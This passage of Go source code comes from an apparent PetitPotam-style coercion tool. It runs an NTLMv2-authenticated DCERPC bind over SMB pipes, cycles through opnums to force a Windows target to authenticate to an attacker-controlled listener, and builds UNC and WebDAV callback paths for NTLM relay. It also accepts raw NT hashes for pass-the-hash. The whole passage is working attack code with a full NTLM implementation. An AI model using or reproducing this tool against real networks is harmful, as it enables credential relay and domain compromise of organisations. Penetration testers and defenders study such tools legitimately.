		return fmt.Errorf("DCERPC auth bind failed: %v", err)
	}

	fmt.Println("[+] DCERPC authentication complete!")

	// Try all opnums
	var lastErr error
	successfulOpnum := -1
	for _, opnum := range method.Opnums {
		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)

		stub := method.CreateStub(listenerIP, opnum)
		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)

		if err != nil {
			if err.Error() == "got fault 0x5" {
				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
				successfulOpnum = int(opnum)
			}
			lastErr = err
		} else {
			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
			successfulOpnum = int(opnum)
			lastErr = nil
		}
	}

	if successfulOpnum >= 0 {
		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
	}

	return lastErr
}

// performAuthenticatedBind performs the 3-way DCERPC authentication handshake
func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share string, pipeName string, uuid string, majorVer uint16, minorVer uint16, auth *NTLMAuth) error {
	// Step 1: Send Bind with NTLM Negotiate
	negotiateMsg := createNTLMNegotiate()
	auth.negotiateMsg = negotiateMsg // Save for MIC calculation
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] NTLM Negotiate (%d bytes): %x\n", len(negotiateMsg), negotiateMsg)
		}
	}

	bindReq := createDCERPCBindWithAuth(negotiateMsg, uuid, majorVer, minorVer)
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Bind packet (%d bytes): %x\n", len(bindReq), bindReq)
		}
	}

	fmt.Println("[+] Sending Bind via WriteFile...")
	_, err := (*pipe).WriteFile(bindReq, 0)
	if err != nil {
		return fmt.Errorf("bind write failed: %v", err)
	}

	// Read response
	bindAck := make([]byte, 4096)
	n, err := (*pipe).ReadFile(bindAck, 0)
	if err != nil {
		return fmt.Errorf("bind read failed: %v", err)
	}
	bindAck = bindAck[:n]
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] BindAck length: %d\n", len(bindAck))
		}
	}
	if len(bindAck) >= 3 {
		if verbose {
			if verbose {
				fmt.Printf("[DEBUG] Packet type: %d (expected %d for BindAck)\n", bindAck[2], dcerpcBindAck)
			}
		}
	}
	if len(bindAck) >= 24 {
		if verbose {
			if verbose {
				fmt.Printf("[DEBUG] First 24 bytes: %x\n", bindAck[:24])
			}
		}
	}

	if len(bindAck) < 24 {
		return fmt.Errorf("response too short: len=%d", len(bindAck))
	}

	if bindAck[2] == 13 { // BindNak
		// BindNak format: header + reject_reason (uint16)
		// The reject reason is in the call_id field for BindNak
		callID := binary.LittleEndian.Uint32(bindAck[12:16])
		if verbose {
			if verbose {
				fmt.Printf("[DEBUG] Full BindNak: %x\n", bindAck)
			}
		}
		return fmt.Errorf("bind rejected (BindNak) - call_id/reason: 0x%x", callID)
	}

	if bindAck[2] != dcerpcBindAck {
		return fmt.Errorf("unexpected bind response: type=%d", bindAck[2])
	}

	fmt.Println("[+] Received BindAck")

	// Extract NTLM Challenge from BindAck auth trailer
	authLen := binary.LittleEndian.Uint16(bindAck[10:12]) // auth_len is at offset 10
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] auth_len = %d\n", authLen)
		}
	}

	if authLen == 0 {
		return fmt.Errorf("no auth data in BindAck")
	}

	// Auth trailer is at the end of the packet
	fragLen := binary.LittleEndian.Uint16(bindAck[8:10])
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] frag_len = %d, packet len = %d\n", fragLen, len(bindAck))
		}
	}

	authTrailerStart := int(fragLen) - int(authLen) - 8 // 8 bytes for auth header
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Calculated authTrailerStart = %d\n", authTrailerStart)
		}
	}

	if authTrailerStart < 24 || authTrailerStart+int(authLen)+8 > int(fragLen) {
		return fmt.Errorf("invalid auth trailer position: start=%d, authLen=%d, fragLen=%d", authTrailerStart, authLen, fragLen)
	}

	// Extract auth_context_id from auth trailer (bytes 4-7 of the 8-byte auth header)
	serverAuthContextID := binary.LittleEndian.Uint32(bindAck[authTrailerStart+4 : authTrailerStart+8])
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Server returned auth_context_id: %d (0x%x)\n", serverAuthContextID, serverAuthContextID)
		}
	}

	// Store it for use in subsequent authenticated requests
	auth.authContextID = serverAuthContextID

	challengeMsg := bindAck[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
	auth.challengeMsg = challengeMsg // Save for MIC calculation

	// Parse challenge
	if len(challengeMsg) < 32 {
		return fmt.Errorf("challenge message too short")
	}

	// Extract server challenge (8 bytes at offset 24)
	auth.challenge = challengeMsg[24:32]
	fmt.Printf("[+] Got NTLM challenge: %x\n", auth.challenge)

	// Extract challenge flags (4 bytes at offset 20)
	challengeFlags := binary.LittleEndian.Uint32(challengeMsg[20:24])
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Challenge flags: 0x%08x\n", challengeFlags)
		}
	}
	auth.flags = challengeFlags // Store flags for Authenticate message

	// Step 2: Generate NTLM Authenticate message (manual to get session keys)
	authenticateMsg := createNTLMAuthenticate(auth, challengeMsg)
	if authenticateMsg == nil {
		return fmt.Errorf("failed to create authenticate message")
	}
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Authenticate message (%d bytes): %x\n", len(authenticateMsg), authenticateMsg[:min2(100, len(authenticateMsg))])
		}
		if verbose {
			fmt.Printf("[DEBUG] Calculated session keys for encryption\n")
		}
	}

	// Step 3: Send Auth3 - according to impacket research, this DOES get an SMB Write Response
	auth3Req := createDCERPCAuth3(auth, authenticateMsg)
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Sending Auth3 (%d bytes) via WriteFile\n", len(auth3Req))
		}
	}

	// Use WriteFile which waits for SMB Write Response (like impacket's writeFile)
	fmt.Println("[+] Sending Auth3 via WriteFile (should get SMB Write Response)...")
	nAuth3, err := (*pipe).WriteFile(auth3Req, 0)
	if err != nil {
		return fmt.Errorf("Auth3 write failed: %v", err)
	}
	fmt.Printf("[+] Auth3 complete - wrote %d bytes, got SMB Write Response\n", nAuth3)

	return nil
}

func min2(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// createNTLMNegotiate creates an NTLM Negotiate message (Type 1)
//
// CRITICAL SUCCESS FACTORS:
// 1. MUST include NTLMSSP_NEGOTIATE_TARGET_INFO (0x00800000) - Without this, Windows rejects authentication
// 2. MUST include NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY (0x00080000) - Required for NTLMv2
//
// These two flags tell the server we want NTLMv2 with extended security and target info.
// Without them, Windows will return ACCESS_DENIED (0x5) before even attempting coercion.
//
// The flags negotiated here determine what's available in Type 3 (Authenticate).
// Type 3 flags will be: (Type 1 flags) AND (Type 2 Challenge flags)
func createNTLMNegotiate() []byte {
	buf := new(bytes.Buffer)
	buf.WriteString("NTLMSSP\x00")                    // Signature
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Message Type: 1 (Negotiate)

	// CRITICAL FLAGS for NTLMv2 success
	flags := uint32(0x20000000 | // NTLMSSP_NEGOTIATE_128 - 128-bit encryption
		0x40000000 | // NTLMSSP_NEGOTIATE_KEY_EXCH - Exchange session key
		0x02000000 | // NTLMSSP_NEGOTIATE_VERSION - Include version info
		0x00800000 | // NTLMSSP_NEGOTIATE_TARGET_INFO ⚠️ CRITICAL - Request target info (required for NTLMv2)
		0x00080000 | // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY ⚠️ CRITICAL - Use NTLM2 (required for NTLMv2)
		0x00000200 | // NTLMSSP_NEGOTIATE_NTLM - Use NTLM authentication
		0x00000004 | // NTLMSSP_REQUEST_TARGET - Request target name
		0x00000001 | // NTLMSSP_NEGOTIATE_UNICODE - Unicode strings
		0x00000010 | // NTLMSSP_NEGOTIATE_SIGN - Message signing
		0x00000020) // NTLMSSP_NEGOTIATE_SEAL - Message encryption

	binary.Write(buf, binary.LittleEndian, flags)

	// Domain fields (empty)
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Len
	binary.Write(buf, binary.LittleEndian, uint16(0)) // MaxLen
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset

	// Workstation fields (empty)
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Len
	binary.Write(buf, binary.LittleEndian, uint16(0)) // MaxLen
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset

	// VERSION structure (required when VERSION flag is set)
	buf.WriteByte(6)                                       // ProductMajorVersion
	buf.WriteByte(1)                                       // ProductMinorVersion
	binary.Write(buf, binary.LittleEndian, uint16(0x1db1)) // ProductBuild
	buf.WriteByte(0)                                       // Reserved1
	buf.WriteByte(0)                                       // Reserved2
	buf.WriteByte(0)                                       // Reserved3
	buf.WriteByte(15)                                      // NTLMRevisionCurrent

	return buf.Bytes()
}

// createNTLMAuthenticate creates an NTLM Authenticate message (Type 3) with NTLMv2
func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
	// Extract target info from challenge message (at offset 40+)
	// Challenge structure: sig(8) + type(4) + targetNameLen(2) + targetNameMaxLen(2) + targetNameOffset(4) +
	// flags(4) + serverChallenge(8) + reserved(8) + targetInfoLen(2) + targetInfoMaxLen(2) + targetInfoOffset(4) + ...

	targetInfo := createMinimalTargetInfo()

	var hostname []byte
	if len(challengeMsg) > 48 {
		targetInfoLen := binary.LittleEndian.Uint16(challengeMsg[40:42])
		targetInfoOffset := binary.LittleEndian.Uint32(challengeMsg[44:48])
		if verbose {
			if verbose {
				fmt.Printf("[DEBUG] Challenge targetInfo: len=%d, offset=%d, challengeLen=%d\n", targetInfoLen, targetInfoOffset, len(challengeMsg))
			}
		}
		if int(targetInfoOffset)+int(targetInfoLen) <= len(challengeMsg) {
			targetInfo = challengeMsg[targetInfoOffset : targetInfoOffset+uint32(targetInfoLen)]
			if verbose {
				if verbose {
					fmt.Printf("[DEBUG] Using extracted targetInfo (%d bytes)\n", len(targetInfo))
				}
			}

			// Extract hostname from targetInfo for TARGET_NAME construction
			hostname = extractHostnameFromTargetInfo(targetInfo)
		}
	}

	// Add TARGET_NAME AV_PAIR for SPN target name validation
	// This is required to avoid ACCESS_DENIED
	// TARGET_NAME uses hostname from Challenge (DC's hostname)
	if len(hostname) > 0 {
		targetInfo = addTargetNameToAVPairs(targetInfo, hostname)
	}
	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] Added TARGET_NAME AV_PAIR to targetInfo (%d bytes total)\n", len(targetInfo))
		}
		if verbose {
			fmt.Printf("[DEBUG] targetInfo hex dump (last 50 bytes): %x\n", targetInfo[len(targetInfo)-50:])
		}
		// Write targetInfo to file for debugging
		os.WriteFile("/tmp/targetinfo_debug.bin", targetInfo, 0644)
	}

	// Calculate NTLMv2 response
	timestamp := time.Now().UnixNano() / 100
	timestamp += 116444736000000000

	clientChallenge := make([]byte, 8)
	rand.Read(clientChallenge) // Use random client challenge

	temp := buildTempBlob(timestamp, clientChallenge, targetInfo)

	// Use pre-computed hash if available, otherwise compute from password
	var ntHashBytes []byte
	if auth.hash != nil && len(auth.hash) == 16 {
		ntHashBytes = auth.hash
	} else {
		ntHashBytes = ntHash(auth.password)
	}

	ntlmv2Hash := ntlmv2Hash(ntHashBytes, auth.user, auth.domain)
	ntlmv2Resp := calculateNTLMv2Response(ntlmv2Hash, auth.challenge, temp)

	// Calculate session keys from this NTLMv2 response
	auth.sessionBaseKey = calculateSessionBaseKey(ntlmv2Hash, ntlmv2Resp[:16])
	auth.clientSignKey = calculateSignKey(auth.sessionBaseKey, true)
	auth.clientSealKey = calculateSealKey(auth.sessionBaseKey, true)

	if verbose {
		if verbose {
			fmt.Printf("[DEBUG] NTProofStr: %x\n", ntlmv2Resp[:16])
		}
	}
	if verbose {
		fmt.Printf("[DEBUG] SessionBaseKey: %x\n", auth.sessionBaseKey)
	}

	// Build Authenticate message manually
	buf := new(bytes.Buffer)
	buf.WriteString("NTLMSSP\x00")
	binary.Write(buf, binary.LittleEndian, uint32(3)) // Type 3

	domainUTF16 := stringToUTF16LE(auth.domain) // Python doesn't uppercase domain in Type 3
	userUTF16 := stringToUTF16LE(auth.user)
	workstationUTF16 := stringToUTF16LE("") // Empty workstation

	// Create NTLMv2 LM response: HMAC-MD5(ntlmv2Hash, serverChallenge + clientChallenge) + clientChallenge
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(auth.challenge)
	h.Write(clientChallenge)
	lmResp := append(h.Sum(nil), clientChallenge...)
	if verbose {
		fmt.Printf("[DEBUG] Client challenge (%d bytes): %x\n", len(clientChallenge), clientChallenge)
	}
	if verbose {
		fmt.Printf("[DEBUG] LM response (%d bytes): %x\n", len(lmResp), lmResp)
	}
	if verbose {
		fmt.Printf("[DEBUG] Server challenge: %x\n", auth.challenge)
	}

	// Calculate base offset: 64-byte standard header + VERSION (8) + MIC (16) if present
	baseOffset := 64
	if auth.flags&0x02000000 != 0 { // VERSION flag set
		baseOffset += 8  // VERSION field
		baseOffset += 16 // MIC field
	}
	offset := baseOffset

	if verbose {
		fmt.Printf("[DEBUG] Base offset for payload: %d bytes\n", baseOffset)
	}

	// LM response
	binary.Write(buf, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(buf, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(lmResp)

	// NTLM response
	binary.Write(buf, binary.LittleEndian, uint16(len(ntlmv2Resp)))
	binary.Write(buf, binary.LittleEndian, uint16(len(ntlmv2Resp)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(ntlmv2Resp)

	// Domain
	binary.Write(buf, binary.LittleEndian, uint16(len(domainUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(domainUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(domainUTF16)

	// User
	binary.Write(buf, binary.LittleEndian, uint16(len(userUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(userUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(userUTF16)

	// Workstation
	binary.Write(buf, binary.LittleEndian, uint16(len(workstationUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(workstationUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(workstationUTF16)

	// Handle session key export (for MIC and subsequent signing/sealing)
	// NTLMSSP_NEGOTIATE_KEY_EXCH = 0x40000000
	var encryptedRandomSessionKey []byte
	var exportedSessionKey []byte

	keyExchangeKey := auth.sessionBaseKey // For NTLMv2, this is the sessionBaseKey

	if auth.flags&0x40000000 != 0 {
		// KEY_EXCH negotiated: generate random session key and encrypt it
		exportedSessionKey = make([]byte, 16)
		rand.Read(exportedSessionKey)

		// Encrypt it with keyExchangeKey
		cipher, _ := rc4.NewCipher(keyExchangeKey)
		encryptedRandomSessionKey = make([]byte, 16)
		cipher.XORKeyStream(encryptedRandomSessionKey, exportedSessionKey)

		if verbose {
			fmt.Printf("[DEBUG] KEY_EXCH: Generated random exported session key: %x\n", exportedSessionKey)
		}
		if verbose {
			fmt.Printf("[DEBUG] KEY_EXCH: Encrypted session key: %x\n", encryptedRandomSessionKey)
		}
	} else {
		// KEY_EXCH not negotiated: exportedSessionKey = keyExchangeKey (no encryption)
		exportedSessionKey = keyExchangeKey
		encryptedRandomSessionKey = []byte{} // Empty - no encrypted session key field
		if verbose {
			fmt.Printf("[DEBUG] NO KEY_EXCH: Using keyExchangeKey as exportedSessionKey: %x\n", exportedSessionKey)
		}
	}

	// Update our signing/sealing keys to use exportedSessionKey
	auth.sessionBaseKey = exportedSessionKey
	auth.clientSignKey = calculateSignKey(exportedSessionKey, true)
	auth.clientSealKey = calculateSealKey(exportedSessionKey, true)
	auth.serverSignKey = calculateSignKey(exportedSessionKey, false) // Server keys for decrypting responses
	auth.serverSealKey = calculateSealKey(exportedSessionKey, false)

	// Initialize RC4 cipher handles - these MUST be continuous streams (never reset!)
	// This is critical for NTLM - impacket uses the same cipher handle throughout
	auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)
	auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)

	if verbose {
		fmt.Printf("[DEBUG] Final SessionBaseKey (for MIC and crypto): %x\n", auth.sessionBaseKey)
	}
	if verbose {
		fmt.Printf("[DEBUG] Final Client SignKey: %x\n", auth.clientSignKey)
	}
	if verbose {
		fmt.Printf("[DEBUG] Final Client SealKey: %x\n", auth.clientSealKey)
	}
	if verbose {
		fmt.Printf("[DEBUG] Final Server SignKey: %x\n", auth.serverSignKey)
	}
	if verbose {
		fmt.Printf("[DEBUG] Final Server SealKey: %x\n", auth.serverSealKey)
	}

	// Session key
	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(encryptedRandomSessionKey)

	// Flags - Python includes EXTENDED_SESSIONSECURITY + TARGET_INFO even if not in Type 1
	// Must include these for NTLMv2 to work properly
	type1Flags := uint32(0x62000231) // Our original Type 1 flags
	responseFlags := type1Flags

	// Force EXTENDED_SESSIONSECURITY and TARGET_INFO for NTLMv2
	responseFlags |= 0x00080000 // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
	responseFlags |= 0x00800000 // NTLMSSP_NEGOTIATE_TARGET_INFO

	// Mask out flags that Challenge doesn't support (same as Python)
	if auth.flags&0x20000000 == 0 { // NTLMSSP_NEGOTIATE_128
		responseFlags &= ^uint32(0x20000000)
	}
	if auth.flags&0x40000000 == 0 { // NTLMSSP_NEGOTIATE_KEY_EXCH
		responseFlags &= ^uint32(0x40000000)
	}
	if auth.flags&0x00000020 == 0 { // NTLMSSP_NEGOTIATE_SEAL
		responseFlags &= ^uint32(0x00000020)
	}
	if auth.flags&0x00000010 == 0 { // NTLMSSP_NEGOTIATE_SIGN
		responseFlags &= ^uint32(0x00000010)
	}
	if auth.flags&0x00008000 == 0 { // NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		responseFlags &= ^uint32(0x00008000)
	}

	if verbose {
		fmt.Printf("[DEBUG] Type 1 flags: 0x%08x\n", type1Flags)
	}
	if verbose {
		fmt.Printf("[DEBUG] Challenge flags (auth.flags): 0x%08x\n", auth.flags)
	}
	if verbose {
		fmt.Printf("[DEBUG] Response flags (Type 3): 0x%08x\n", responseFlags)
	}
	binary.Write(buf, binary.LittleEndian, responseFlags)

	// Include VERSION field if NEGOTIATE_VERSION was set (8 bytes)
	if auth.flags&0x02000000 != 0 {
		// NTLM version 6.1.7601.0 (Windows 7/Server 2008 R2)
		buf.WriteByte(6)                                     // Major version
		buf.WriteByte(1)                                     // Minor version
		binary.Write(buf, binary.LittleEndian, uint16(7601)) // Build number
		buf.Write([]byte{0, 0, 0})                           // Reserved
		buf.WriteByte(15)                                    // NTLM revision
	}

	// MIC field (16 bytes) - will be computed later
	if auth.flags&0x02000000 != 0 {
		buf.Write(make([]byte, 16)) // Placeholder for MIC
	}

	buf.Write(lmResp)
	buf.Write(ntlmv2Resp)
	buf.Write(domainUTF16)
	buf.Write(userUTF16)
	buf.Write(workstationUTF16)
	buf.Write(encryptedRandomSessionKey)

	authenticateMsg := buf.Bytes()

	if verbose {
		fmt.Printf("[DEBUG] Authenticate message breakdown:\n")
	}
	fmt.Printf("  Header: 64, VERSION: %d, MIC: %d\n", 8, 16)
	fmt.Printf("  LM response: %d bytes\n", len(lmResp))
	fmt.Printf("  NTLM response: %d bytes\n", len(ntlmv2Resp))
	fmt.Printf("  Domain: %d bytes\n", len(domainUTF16))
	fmt.Printf("  User: %d bytes\n", len(userUTF16))
	fmt.Printf("  Workstation: %d bytes\n", len(workstationUTF16))
	fmt.Printf("  Encrypted session key: %d bytes\n", len(encryptedRandomSessionKey))
	fmt.Printf("  Total: %d bytes\n", len(authenticateMsg))

	// Write full authenticate message for analysis
	os.WriteFile("/tmp/go_authenticate.bin", authenticateMsg, 0644)
	if verbose {
		fmt.Printf("[DEBUG] Full Authenticate message written to /tmp/go_authenticate.bin\n")
	}
	if verbose {
		fmt.Printf("[DEBUG] Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
	}

	// Compute MIC if VERSION flag is set
	// MIC = HMAC-MD5(exportedSessionKey, Negotiate + Challenge + Authenticate[with MIC zeroed])
	if auth.flags&0x02000000 != 0 && len(exportedSessionKey) > 0 {
		// MIC is the HMAC-MD5 over all three NTLM messages
		// It's placed right after the VERSION field
		micFieldOffset := 64 + 8 // 64-byte header + 8-byte VERSION

		// Calculate MIC: HMAC-MD5(exportedSessionKey, Negotiate + Challenge + Authenticate[with MIC=0])
		// Use exportedSessionKey directly for MIC (this is the session base key, not the signing key)
		h := hmac.New(md5.New, exportedSessionKey)
		h.Write(auth.negotiateMsg)
		h.Write(auth.challengeMsg)
		h.Write(authenticateMsg) // MIC is already zeroed in authenticateMsg
		mic := h.Sum(nil)

		if verbose {
			fmt.Printf("[DEBUG] MIC calculated: %x\n", mic)
		}

		// Place MIC in the message
		copy(authenticateMsg[micFieldOffset:micFieldOffset+16], mic)
	}

	if verbose {
		fmt.Printf("[DEBUG] Final Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
	}

	return authenticateMsg
}

// ========== NTLM Cryptographic Functions ==========

// isNTLMHash checks if the input is a valid NTLM hash (32 hex characters)
func isNTLMHash(input string) bool {
	if len(input) != 32 {
		return false
	}
	for _, c := range input {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// isValidIP validates IPv4 address format
func isValidIP(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		if len(part) == 0 || len(part) > 3 {
			return false
		}
		num := 0
		for _, c := range part {
			if c < '0' || c > '9' {
				return false
			}
			num = num*10 + int(c-'0')
		}
		if num > 255 {
			return false
		}
	}
	return true
}

// buildCallbackPath builds the appropriate path for HTTP (WebDAV) or UNC mode
// For HTTP/WebDAV: \\<listener>@<port>/path\nested\file (triggers WebClient HTTP request)
// For UNC: \\<listener>\<sharename>\<filename>
func buildCallbackPath(listenerIP string, httpMode bool, shareName string, fileName string) string {
	if httpMode {
		// WebDAV connection string format - this triggers Windows WebClient to make HTTP requests
		// Format: \\SERVER@PORT/path\nested\file (FORWARD SLASH after @PORT, then BACKSLASHES)
		// This matches PetitPotam.py's proven working format
		path := "\\\\" + listenerIP
		// If no port specified in listenerIP, default to port 80
		if !strings.Contains(listenerIP, "@") {
			path = "\\\\" + listenerIP + "@80"
		}

		// For HTTP mode, use the proven PetitPotam format: append \test\Settings.ini
		// This works better than custom shareName/fileName for WebDAV
		if shareName == "" && fileName == "" {
			// Default to PetitPotam's proven format
			path += "\\test\\Settings.ini"
		} else {
			// Custom share/file specified - use backslashes
			if shareName != "" {
				path += "\\" + shareName
			}
			if fileName != "" {
				path += "\\" + fileName
			}
		}
		return path + "\x00"
	}
	// UNC path format (SMB)
	path := "\\\\" + listenerIP
	if shareName != "" {
		path += "\\" + shareName
	}
	if fileName != "" {
		path += "\\" + fileName
	}
	return path + "\x00"
}

// buildCallbackPaths builds multiple path variations for PetitPotam coercion
// Returns different formats that work across Windows versions
func buildCallbackPaths(listenerIP string, httpMode bool) []string {
	if httpMode {
		// WebDAV/HTTP mode: Multiple formats for maximum compatibility
		// CRITICAL: Use FORWARD SLASHES (/) not backslashes (\\) after @PORT!
		// This matches PetitPotam.py: 10.1.1.99@80/test

		var paths []string

		// Format 1: IP@80/path variations (FORWARD SLASHES for WebDAV!)
		webdavHost80 := listenerIP
		if !strings.Contains(listenerIP, "@") {
			webdavHost80 = listenerIP + "@80"
		}

		// CRITICAL: Match PetitPotam.py exactly - it uses BACKSLASH for appended paths
		// PetitPotam.py does: '\\\\%s\\test\\Settings.ini' % listener
		// So if listener is "10.1.1.99@80/test", it becomes: \\10.1.1.99@80/test\test\Settings.ini
		paths = append(paths,
			"\\\\"+webdavHost80+"\\test\\Settings.ini\x00", // Exact PetitPotam.py format!
			"\\\\"+webdavHost80+"/test\\Settings.ini\x00",  // Mixed slashes variant
			"\\\\"+webdavHost80+"/test/Settings.ini\x00",   // All forward slashes
			"\\\\"+webdavHost80+"/DavWWWRoot/test.txt\x00",
			"\\\\"+webdavHost80+"/test/file.txt\x00",
			"\\\\"+webdavHost80+"/test\x00",
		)

		// Format 2: IP@SSL@443 for HTTPS WebDAV
		webdavHostSSL := listenerIP
		if !strings.Contains(listenerIP, "@") {
			webdavHostSSL = listenerIP + "@SSL@443"
		}
		paths = append(paths,
			"\\\\"+webdavHostSSL+"/DavWWWRoot/test.txt\x00",
			"\\\\"+webdavHostSSL+"/test/file.txt\x00",
		)

		// Format 3: Simple format matching PetitPotam.py
		paths = append(paths,
			"\\\\"+webdavHost80+"/share\x00",
		)

		return paths
	}
	// UNC mode: standard path variations
	return []string{
		"\\\\" + listenerIP + "\\test\\file.txt\x00",
		"\\\\" + listenerIP + "\\test\\\x00",
		"\\\\" + listenerIP + "\\test\x00",
	}
}

// ntHash computes the NT hash (MD4) of a password OR uses a pre-computed hash

// This is the base hash used in NTLM authentication
// Input: plaintext password OR 32-character NTLM hash (pass-the-hash)
// Output: 16-byte MD4 hash
func ntHash(passwordOrHash string) []byte {
	// Check if input is already an NTLM hash (32 hex characters)
	if isNTLMHash(passwordOrHash) {
		// Don't print message here - already printed during SMB connection
		hash, err := hex.DecodeString(passwordOrHash)
		if err != nil || len(hash) != 16 {
			// Fall through to password hashing if decode fails
		} else {
			return hash
		}
	}

	// Compute MD4 hash from plaintext password
	h := md4.New()
	h.Write(stringToUTF16LE(passwordOrHash))
	return h.Sum(nil)
}

// ntlmv2Hash computes the NTLMv2 hash used for authentication
//
// CRITICAL: Only the USERNAME is uppercased, NOT the domain!
// Formula: HMAC-MD5(NT_hash, uppercase(username) + domain)
//
// This is different from some docs which incorrectly show both being uppercased.
// Python impacket does: user.upper().encode('utf-16le') + domain.encode('utf-16le')
//
// Input:
//   - ntHash: 16-byte NT hash of password (from ntHash function)
//   - user: username (will be uppercased)
//   - domain: domain name (will NOT be uppercased)
//
// Output: 16-byte NTLMv2 hash
func ntlmv2Hash(ntHash []byte, user, domain string) []byte {
	h := hmac.New(md5.New, ntHash)
	// CRITICAL: Only uppercase the user, NOT the domain!
	userUpper := uppercaseString(user)
	identity := userUpper + domain
	if verbose {
		fmt.Printf("[DEBUG] NTLMv2 identity: user='%s' (upper: '%s') + domain='%s' = '%s'\n", user, userUpper, domain, identity)
	}
	h.Write(stringToUTF16LE(identity))
	return h.Sum(nil)
}

// calculateNTLMv2Response creates the NTLMv2 response (NTProofStr + temp blob)
//
// Formula: HMAC-MD5(ntlmv2Hash, serverChallenge + temp) + temp
//
// The response consists of:
//   - NTProofStr (16 bytes): HMAC-MD5 of challenge + temp blob
//   - temp blob: Contains timestamp, client challenge, targetInfo
//
// Input:
//   - ntlmv2Hash: 16-byte NTLMv2 hash (from ntlmv2Hash function)
//   - serverChallenge: 8-byte server challenge from Type 2 message
//   - temp: Temp blob containing timestamp, client challenge, targetInfo
//
// Output: NTLMv2 response (typically ~302 bytes)
func calculateNTLMv2Response(ntlmv2Hash, serverChallenge, temp []byte) []byte {
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(serverChallenge)
	h.Write(temp)
	resp := h.Sum(nil) // This is the NTProofStr (first 16 bytes of response)
	return append(resp, temp...)
}

// calculateSessionBaseKey derives the session base key from NTLMv2 response
//
// Formula: HMAC-MD5(ntlmv2Hash, NTProofStr)
//
// This key is used to derive signing and sealing keys, and for KEY_EXCH encryption.
//
// Input:
//   - ntlmv2Hash: 16-byte NTLMv2 hash
//   - ntProofStr: First 16 bytes of NTLMv2 response
//
// Output: 16-byte session base key
func calculateSessionBaseKey(ntlmv2Hash, ntProofStr []byte) []byte {
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(ntProofStr)
	return h.Sum(nil)
}

// calculateSignKey derives the signing key from session key
//
// Formula: MD5(sessionKey + magic_constant)
//
// The magic constant differs for client-to-server vs server-to-client.
// This key is used in NTLM signature generation (not directly in RC4).
//
// Input:
//   - sessionKey: 16-byte session key (typically exportedSessionKey after KEY_EXCH)
//   - client: true for client-to-server key, false for server-to-client
//
// Output: 16-byte signing key
func calculateSignKey(sessionKey []byte, client bool) []byte {
	var magic string
	if client {
		magic = "session key to client-to-server signing key magic constant\x00"
	} else {
		magic = "session key to server-to-client signing key magic constant\x00"
	}
	h := md5.New()
	h.Write(sessionKey)
	h.Write([]byte(magic))
	return h.Sum(nil)
}

// calculateSealKey derives the sealing (encryption) key from session key
//
// Formula: MD5(sessionKey + magic_constant)
//
// The magic constant differs for client-to-server vs server-to-client.
// This key is used to initialize the RC4 cipher for encryption.
//
// CRITICAL: The RC4 cipher initialized with this key MUST be reused for all
// subsequent encryption operations. Never call rc4.NewCipher() again after
// the initial cipher creation.
//
// Input:
//   - sessionKey: 16-byte session key (typically exportedSessionKey after KEY_EXCH)
//   - client: true for client-to-server key, false for server-to-client
//
// Output: 16-byte sealing key (used to initialize RC4 cipher)
func calculateSealKey(sessionKey []byte, client bool) []byte {
	var magic string
	if client {
		magic = "session key to client-to-server sealing key magic constant\x00"
	} else {
		magic = "session key to server-to-client sealing key magic constant\x00"
	}
	h := md5.New()
	h.Write(sessionKey)
	h.Write([]byte(magic))
	return h.Sum(nil)
